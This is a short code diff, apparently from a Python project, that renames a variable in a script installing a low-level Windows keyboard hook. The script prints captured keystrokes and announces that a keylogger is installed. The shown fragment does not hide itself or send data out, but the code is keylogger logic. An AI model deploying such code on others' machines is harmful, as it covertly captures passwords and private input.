@@ -14,10 +14,10 @@ def my_func(wParam, lParam):
     print(lParam.contents)
 
 
-keyLogger = Logger(WH_KEYBOARD_LL, my_func)
-address = keyLogger.get_fptr(keyLogger.hook_proc)
+logger = Logger(WH_KEYBOARD_LL, my_func)
+address = logger.get_fptr(logger.hook_proc)
 
-if keyLogger.install_hook_proc(address):
+if logger.install_hook_proc(address):
     print("installed keyLogger")
 
-keyLogger.start_key_log()
+logger.start_key_log()
